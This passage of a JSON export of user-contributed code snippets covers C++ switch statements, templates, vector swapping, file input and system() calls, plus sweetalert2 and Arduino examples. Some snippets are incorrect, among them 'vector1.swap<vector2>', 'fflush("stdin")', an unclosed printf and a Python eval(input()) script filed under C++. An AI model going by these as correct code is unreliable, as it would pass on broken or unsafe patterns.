    "description": "std::iter_swap(arr.begin()+pos1,arr.begin()+pos2);\nvector<T>().swap(x);   // clear x reallocating \nvector1.swap<vector2>; //time complexity: O(1)\n// clearing vectors #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size(); i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    myvector.clear();   myvector.push_back (1101);   myvector.push_back (2202);    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size(); i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\n#include <iostream> #include <vector>   template<class Os, class Co> Os& operator<<(Os& os, const Co& co) {     os << \"{\";     for (auto const& i : co) { os << ' ' << i; }     return os << \" } \"; }   int main() {     std::vector<int> a1{1, 2, 3}, a2{4, 5};       auto it1 = std::next(a1.begin());     auto it2 = std::next(a2.begin());       int& ref1 = a1.front();     int& ref2 = a2.front();       std::cout << a1 << a2 << *it1 << ' ' << *it2 << ' ' << ref1 << ' ' << ref2 << '\\n';     a1.swap(a2);     std::cout << a1 << a2 << *it1 << ' ' << *it2 << ' ' << ref1 << ' ' << ref2 << '\\n';       // Note that after swap the iterators and references stay associated with their     // original elements, e.g. it1 that pointed to an element in 'a1' with value 2     // still points to the same element, though this element was moved into 'a2'. }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3932,
    "keyword": null,
    "link": null,
    "title": " sweetalert2 email and password",
    "description": "swal({             title: 'Multiple inputs',             html:                 '<input id=\"swal-input1\" class=\"swal2-input\">' +                 '<input id=\"swal-input2\" class=\"swal2-input\">',             preConfirm: function () {                 return new Promise(function (resolve) {                     // Validate input                     if ($('#swal-input1').val() == '' || $('#swal-input2').val() == '') {                         swal.showValidationMessage(\"Enter a value in both fields\"); // Show error when validation fails.                         swal.enableConfirmButton(); // Enable the confirm button again.                     } else {                         swal.resetValidationMessage(); // Reset the validation message.                         resolve([                             $('#swal-input1').val(),                             $('#swal-input2').val()                         ]);                     }                 })             },             onOpen: function () {                 $('#swal-input1').focus()             }         }).then(function (result) {             // If validation fails, the value is undefined. Break out here.             if (typeof(result.value) == 'undefined') {                 return false;             }             swal(JSON.stringify(result))         }).catch(swal.noop) \n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3933,
    "keyword": null,
    "link": null,
    "title": " swich case arduino",
    "description": "// Arduino => c++ switch (var) {   case 1:     //do something when var equals 1     break;   case 2:     //do something when var equals 2     break;   default:     // if nothing else matches, do the default     // default is optional     break; }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3934,
    "keyword": null,
    "link": null,
    "title": " switch c++",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch(a) {   case -1:     std::cout << \"a == -1\" << std::endl;   break;    case 0:     std::cout << \"a == 0\" << std::endl;   break;    default:     std::cout << \"a is something else\" << std::endl; }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include<iostream> using namespace std;  int main(){ \tswitch(<espressione>){ \t\tcase <costante x>: \t\t\t// Istruzioni \t\t\tbreak; \t\tcase <costante y>: \t\t\t// Istruzioni \t\t\tbreak; \t\tcase <costante z>: \t\t\t// Istruzioni \t\t\tbreak;  \t\t............  \t\tdefault: \t\t\t// Istruzioni \t\t\tbreak; \t} } \n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3935,
    "keyword": null,
    "link": null,
    "title": " switch c",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n#include <stdio.h>  int main(void) {   \tint a = 0;        switch(a)     {        case 1 :           statement(\"a = 1\");           break;         case 2 :           printf(\"a = 2\");           break;         default :        \t  printf(\"a is neither 1 or 2\"); \t      break;     } }\nswitch (expression) {     case constant1:       // statements       break;      case constant2:       // statements       break;      default:       // default statements }\nint i;  switch (i){   case 1:     \t//The Proccess you want to be executed     \tbreak;   case 2:     \t//The Proccess you want to be executed    \t\tbreak;   default:     \tbreak; }\n// example of switch case statement #include <stdio.h>  int main() {     char operator;     double n1, n2;      printf(\"Enter an operator (+, -, *, /): \");     scanf(\"%c\", &operator);     printf(\"Enter two operands: \");     scanf(\"%lf %lf\",&n1, &n2);      switch(operator)     {         case '+':             printf(\"%.1lf + %.1lf = %.1lf\",n1, n2, n1+n2);             break;          case '-':             printf(\"%.1lf - %.1lf = %.1lf\",n1, n2, n1-n2);             break;          case '*':             printf(\"%.1lf * %.1lf = %.1lf\",n1, n2, n1*n2);             break;          case '/':             printf(\"%.1lf / %.1lf = %.1lf\",n1, n2, n1/n2);             break;          // operator doesn't match any case constant +, -, *, /         default:             printf(\"Error! operator is not correct\");     }      return 0; } \nint main(){ \tint n;     printf(\"choose one of those numbers (1, 2, 3)\";     fflush(\"stdin\");     switch(n){         \tcase 1:          \t//do something if n = 1     \tbreak;          case 2:          \t//do something if n = 2     \tbreak;     case 3:     \t//do something if n = 3     \tbreak;          \tdefault:          \tprintf(\"holy moly you suck\"); \t}     return 0;\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3936,
    "keyword": null,
    "link": null,
    "title": " switch case c++",
    "description": "#include <iostream>  using namespace std;     int main() {      // variable declaration  \tint input; \tswitch(input){ \tcase 1: case 2: case 3: case 4: \t\t//executes if input is 1, 2, 3, or 4 \t\tbreak; \tcase 5: case 6: case 7: \t\t//executes if input is 5, 6, or 7         break; \tdefault: \t\t//executes if input isn't any of the cases     }     return 0;  } \nswitch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch(a) {   case -1:     std::cout << \"a == -1\" << std::endl;   break;    case 0:     std::cout << \"a == 0\" << std::endl;   break;    default:     std::cout << \"a is something else\" << std::endl; }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\n// Transfers control to one of the several statements, depending on the  //value of a condition. switch (variable or an integer expression) {      case constant: {      \t//C++ code     \t break;      }      case constant: {      \t//C++ code      \tbreak;      }      default: {      \t//C++ code      \tbreak;    \t } }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3937,
    "keyword": null,
    "link": null,
    "title": " switch case sinax c++",
    "description": "switch (<espressione>) { case <valore costante 1>: // istruzioni break;   case <valore costante 2>: // istruzioni break; ... case <valore costante N>: // istruzioni break; default: // istruzioni break; }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3938,
    "keyword": null,
    "link": null,
    "title": " switch cpp",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\n#include<iostream> using namespace std;  int main(){ \tswitch(<espressione>){ \t\tcase <costante x>: \t\t\t// Istruzioni \t\t\tbreak; \t\tcase <costante y>: \t\t\t// Istruzioni \t\t\tbreak; \t\tcase <costante z>: \t\t\t// Istruzioni \t\t\tbreak;  \t\t............  \t\tdefault: \t\t\t// Istruzioni \t\t\tbreak; \t} } \n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3939,
    "keyword": null,
    "link": null,
    "title": " switch in c++",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \nswitch (variable) {   case 1:     // code here     break   default:     // code here      break }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3940,
    "keyword": null,
    "link": null,
    "title": " switch pattern c++",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n",
    "reg_date": "2021-10-12T11:43:47.000Z"
  },
  {
    "id": 3941,
    "keyword": null,
    "link": null,
    "title": " switch statement c++",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\n#include <iostream> using namespace std;   int main () {    // local variable declaration:    char grade = 'D';     switch(grade) {       case 'A' :          cout << \"Excellent!\" << endl;           break;       case 'B' :       case 'C' :          cout << \"Well done\" << endl;          break;       case 'D' :          cout << \"You passed\" << endl;          break;       case 'F' :          cout << \"Better try again\" << endl;          break;       default :          cout << \"Invalid grade\" << endl;    }    cout << \"Your grade is \" << grade << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3942,
    "keyword": null,
    "link": null,
    "title": " switch statement in c++",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\n#include <iostream> using namespace std;   int main () {    // local variable declaration:    char grade = 'D';     switch(grade) {       case 'A' :          cout << \"Excellent!\" << endl;           break;       case 'B' :       case 'C' :          cout << \"Well done\" << endl;          break;       case 'D' :          cout << \"You passed\" << endl;          break;       case 'F' :          cout << \"Better try again\" << endl;          break;       default :          cout << \"Invalid grade\" << endl;    }    cout << \"Your grade is \" << grade << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3943,
    "keyword": null,
    "link": null,
    "title": " swith statement format",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3944,
    "keyword": null,
    "link": null,
    "title": " sync with stdio",
    "description": "iostream::sync_with_stdio(false);\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3945,
    "keyword": null,
    "link": null,
    "title": " syntax c++",
    "description": "#include<iostream> using namespace std; int main() { \tsystem(\"pause\"); //To pause the screen   \treturn 0; //Not neccessary }\n#include <iostream>  int main() {   std::cout << \"Hello World!\";   return 0; }\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3946,
    "keyword": null,
    "link": null,
    "title": " syntax of if stmt",
    "description": "if (condition) {      //Block of C statements here      //These statements will only execute if the condition is true }\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3947,
    "keyword": null,
    "link": null,
    "title": " syntax of member function in c++",
    "description": "double Box::getVolume(void) {    return length * breadth * height; } \n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3948,
    "keyword": null,
    "link": null,
    "title": " system(\"pause\") note working c++",
    "description": "#include <cstdlib> // use this header in order to include `system` in `main` #include <iostream> // use this header in order to include `cin` in `main`\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3949,
    "keyword": null,
    "link": null,
    "title": " system cls c",
    "description": "system (\"CLS\");\nThe system() function is a part of the C/C++ standard library. It is used to pass the commands that can be executed in the command processor or the terminal of the operating system, and finally returns the command after it has been completed.  <stdlib.h> or <cstdlib> should be included to call this function\nsystem (cls)\n",
    "reg_date": "2021-10-12T11:43:48.000Z"
  },
  {
    "id": 3950,
    "keyword": null,
    "link": null,
    "title": " system cpp",
    "description": "system(\"echo hi\");\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3951,
    "keyword": null,
    "link": null,
    "title": " system was not declared in this scope",
    "description": "#include <cstdlib>\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3952,
    "keyword": null,
    "link": null,
    "title": " tab in c++",
    "description": "'\\t' is a horizontal tab .   It is used for giving tab space horizontally in your output.\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3953,
    "keyword": null,
    "link": null,
    "title": " table c++",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\n#include <iostream> using namespace std; int main() {     int rows,columns;      for (rows = 1; rows <= 6; rows++)     {                  for (columns = 1; columns <= 6; columns++)         {             cout << columns;         }                  cout << \"\\n\";     }               return 0; }\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3954,
    "keyword": null,
    "link": null,
    "title": " take input from user in array c++",
    "description": "int x[6];\n// declare and initialize an array without defining size int x[] = {19, 10, 8, 17, 9, 15};\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3955,
    "keyword": null,
    "link": null,
    "title": " take integer input in c++",
    "description": "#include <iostream> using namespace std; int main() {   //Declare an int variable   int a;   //take input using the standard cin operator   cin >> a;   //display the integer   cout << a;   return 0; }\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3956,
    "keyword": null,
    "link": null,
    "title": " take pieces of a string in c++",
    "description": "#include <iostream> #include <string.h>  using namespace std; int main() {    string str1 = \"Apples are red\";    string str2 = str1.substr(11, 3);    string str3 = str1.substr(0, 6);     cout << \"Substring starting at position 11 and length 3 is: \" << str2 <<endl;    cout << \"Substring starting at position 0 and length 6 is: \" << str3;    return 0; }\n",
    "reg_date": "2021-10-12T11:43:49.000Z"
  },
  {
    "id": 3957,
    "keyword": null,
    "link": null,
    "title": " taking integer input from file in c++",
    "description": "// io/read-file-sum.cpp - Read integers from file and print sum. // Fred Swartz 2003-08-20  #include <iostream> #include <iomanip> #include <fstream> using namespace std;  int main() {     int sum = 0;     int x;     ifstream inFile;          inFile.open(\"test.txt\");     if (!inFile) {         cout << \"Unable to open file\";         exit(1); // terminate with error     }          while (inFile >> x) {         sum = sum + x;     }          inFile.close();     cout << \"Sum = \" << sum << endl;      return 0; } \nWrite a program in which, read 10 integers from a file &ldquo;input.txt&rdquo; into an integer array. Now display prime numbers using pointers.  Input.txt:  10 2 5 7 6 8 4 9 11 13  \n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3958,
    "keyword": null,
    "link": null,
    "title": " taking user input for a vector in c++",
    "description": "vector<int> g1; for(i=0;i<n;i++) {   cin>>a;   g1.push_back(a); }\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3959,
    "keyword": null,
    "link": null,
    "title": " tarray ue4 c++",
    "description": "TArray<int32> IntArray;\n#include \"Containers/Array.h\" //Might need this. header file  // Syntax TArray<Variable_Type> Variable_Name;  // Example code TArray<AActor> Gun;  // For more information vist https://docs.unrealengine.com/en-US/API/Runtime/Core/Containers/TArray/index.html\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3960,
    "keyword": null,
    "link": null,
    "title": " tb6600 stepper motor driver arduino code",
    "description": "int PUL=7; //define Pulse pin int DIR=6; //define Direction pin int ENA=5; //define Enable Pin void setup() {   pinMode (PUL, OUTPUT);   pinMode (DIR, OUTPUT);   pinMode (ENA, OUTPUT);  }  void loop() {   for (int i=0; i<6400; i++)    //Forward 5000 steps   {     digitalWrite(DIR,LOW);     digitalWrite(ENA,HIGH);     digitalWrite(PUL,HIGH);     delayMicroseconds(50);     digitalWrite(PUL,LOW);     delayMicroseconds(50);   }   for (int i=0; i<6400; i++)   //Backward 5000 steps   {     digitalWrite(DIR,HIGH);     digitalWrite(ENA,HIGH);     digitalWrite(PUL,HIGH);     delayMicroseconds(50);     digitalWrite(PUL,LOW);     delayMicroseconds(50);   } }\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3961,
    "keyword": null,
    "link": null,
    "title": " team fortress",
    "description": "when does the heavy update come :(\nhats.\nStill waiting for an update... :'(\nRIP, Rick May.\nThe Bots are gone!\nbots. bots everywhere\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3962,
    "keyword": null,
    "link": null,
    "title": " team olympiad codeforces solution",
    "description": "#include<bits/stdc++.h>  using namespace std;  int main() {     int n,i,t1[5000],t2[5000],t3[5000],x=0,y=0,z=0,w,s;     scanf(\"%d\",&n);     int a[n];     for(i=0;i<n;i++){         scanf(\"%d\",&a[i]);     }     for(i=0;i<n;i++){         if(a[i]==1){             t1[x]=i+1;             x++;         }         else if(a[i]==2){             t2[y]=i+1;             y++;         }         else if(a[i]==3){             t3[z]=i+1;             z++;         }     }     s=min(x,y);     w=min(s,z);     printf(\"%d\\n\",w);     for(x=0,y=0,z=0;x<w,y<w,z<w;x++,y++,z++){         printf(\"%d %d %d\\n\",t1[x],t2[y],t3[z]);     }       return 0; }\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3963,
    "keyword": null,
    "link": null,
    "title": " tellg",
    "description": "// read a file into memory #include <iostream>     // std::cout #include <fstream>      // std::ifstream  int main () {   std::ifstream is (\"test.txt\", std::ifstream::binary);   if (is) {     // get length of file:     is.seekg (0, is.end);     int length = is.tellg();     is.seekg (0, is.beg);      // allocate memory:     char * buffer = new char [length];      // read data as a block:     is.read (buffer,length);      is.close();      // print content:     std::cout.write (buffer,length);      delete[] buffer;   }    return 0; }\n",
    "reg_date": "2021-10-12T11:43:50.000Z"
  },
  {
    "id": 3964,
    "keyword": null,
    "link": null,
    "title": " tellg and seekg c++",
    "description": "// read a file into memory #include <iostream>     // std::cout #include <fstream>      // std::ifstream  int main () {   std::ifstream is (\"test.txt\", std::ifstream::binary);   if (is) {     // get length of file:     is.seekg (0, is.end);     int length = is.tellg();     is.seekg (0, is.beg);      // allocate memory:     char * buffer = new char [length];      // read data as a block:     is.read (buffer,length);      is.close();      // print content:     std::cout.write (buffer,length);      delete[] buffer;   }    return 0; }\n",
    "reg_date": "2021-10-12T11:43:51.000Z"
  },
  {
    "id": 3965,
    "keyword": null,
    "link": null,
    "title": " temperature conversion in c++",
    "description": "#TemperatureConversions.py  def main(): \tunits = input(\"Which temperature you are using? (F for Fahrenheit, C for Celsius): \") \ttemp = eval(input(\"Please enter the temperature: \")) \tif (units == 'F'): \t\tcelcius = 5*(temp - 32)/9 \t\tprint(\"The temperature is\", celcius, \"Celcius.\") \telse: \t\tfahrenheit = 9*temp / 5+32 \t\tprint(\"The temperature is\", fahrenheit, \"Fahrenheig\") main()\n",
    "reg_date": "2021-10-12T11:43:51.000Z"
  },
  {
    "id": 3966,
    "keyword": null,
    "link": null,
    "title": " template+",
    "description": "// function templates #include <iostream> using namespace std;  template <class T, class U> bool are_equal (T a, U b) {   return (a==b); }  int main () {   if (are_equal(10,10.0))     cout << \"x and y are equal\\n\";   else     cout << \"x and y are not equal\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:43:51.000Z"
  },
  {
    "id": 3967,
    "keyword": null,
    "link": null,
    "title": " template",
    "description": "<!doctype html> <html lang=\"en\">   <head>     <!-- Required meta tags -->     <meta charset=\"utf-8\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">      <!-- Bootstrap CSS -->     <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC\" crossorigin=\"anonymous\">      <title>Hello, world!</title>   </head>   <body>     <h1>Hello, world!</h1>      <!-- Optional JavaScript; choose one of the two! -->      <!-- Option 1: Bootstrap Bundle with Popper -->     <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM\" crossorigin=\"anonymous\"></script>      <!-- Option 2: Separate Popper and Bootstrap JS -->     <!--     <script src=\"https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js\" integrity=\"sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p\" crossorigin=\"anonymous\"></script>     <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js\" integrity=\"sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF\" crossorigin=\"anonymous\"></script>     -->   </body> </html> \n>> tmpl = URITemplate.new('/notifications{?since,all,participating}') >> tmpl.expand => \"/notifications\"  >> tmpl.expand :all => 1 => \"/notifications?all=1\"  >> tmpl.expand :all => 1, :participating => 1 => \"/notifications?all=1&participating=1\" \n// function template #include <iostream> using namespace std;  template <class T> T sum (T a, T b) {   T result;   result = a + b;   return result; }  int main () {   int i=5, j=6, k;   double f=2.0, g=0.5, h;   k=sum<int>(i,j);   h=sum<double>(f,g);   cout << k << '\\n';   cout << h << '\\n';   return 0; }\n// function templates #include <iostream> using namespace std;  template <class T, class U> bool are_equal (T a, U b) {   return (a==b); }  int main () {   if (are_equal(10,10.0))     cout << \"x and y are equal\\n\";   else     cout << \"x and y are not equal\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:43:51.000Z"
  },
  {
    "id": 3968,
    "keyword": null,
    "link": null,
    "title": " template c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <vector>  // This is your own template // T it's just a type template <class T1, class T2, typename T3, typename T4 = int> class MyClass {   public:   \tMyClass() { }      private:   \tT1 data; \t\t// For example this data variable is T type   \tT2 anotherData;\t// Actually you can name it as you wish but   \tT3 variable;\t// for convenience you should name it T }  int main(int argc, char **argv) {   std::vector<int> array(10);   //          ^^^   // This is a template in std library      MyClass<int> object();   // This is how it works with your class, just a template for type   // < > angle brackets means \"choose\" any type you want   // But it isn't necessary should work, because of some reasons   // For example you need a type that do not supporting with class   return (0); }\ntemplate class  Graph<string>;\ntemplate <class identifier> function_declaration; template <typename identifier> function_declaration;  //Example: template <class Type>  void Swap( Type &x, Type &y) {     Type Temp = x;     x = y;      y = Temp; } \ntemplate <class myType> myType GetMax (myType a, myType b) {  return (a>b?a:b); }\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
    "id": 3969,
    "keyword": null,
    "link": null,
    "title": " template function in C++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \ntemplate <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }\ntemplate class  Graph<string>;\n// template specialization #include <iostream> using namespace std;  // class template: template <class T> class mycontainer {     T element;   public:     mycontainer (T arg) {element=arg;}     T increase () {return ++element;} };  // class template specialization: template <> class mycontainer <char> {     char element;   public:     mycontainer (char arg) {element=arg;}     char uppercase ()     {       if ((element>='a')&&(element<='z'))       element+='A'-'a';       return element;     } };  int main () {   mycontainer<int> myint (7);   mycontainer<char> mychar ('j');   cout << myint.increase() << endl;   cout << mychar.uppercase() << endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:43:52.000Z"
  },
  {
